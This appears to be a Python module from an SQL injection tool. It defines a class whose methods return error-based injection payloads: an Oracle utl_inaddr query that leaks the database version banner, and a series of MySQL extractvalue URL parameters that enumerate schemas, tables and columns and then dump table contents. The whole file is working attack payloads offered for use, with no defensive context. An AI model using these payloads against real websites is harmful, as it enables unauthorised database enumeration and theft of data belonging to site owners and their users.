import os
import sys

cur = os.getcwd()
sys.path.append(cur)
from INFO.ccolumns import commom_table_naming
from random import choice

class ErrorBasedPayload:
    @staticmethod
    def http_error_req(table):
        payload = f"""
	SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM {table}
"""
        retval = payload
        return str(retval)
    
    @staticmethod
    def Extractvalue(parameter=commom_table_naming()if commom_table_naming() is not None else ""):
        payload = f"""
?{parameter}=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?{parameter}=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?{parameter}=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?{parameter}=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?{parameter}=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 """
        retval = payload
        return str(retval)

# print(ErrorBasedPayload.Extractvalue())

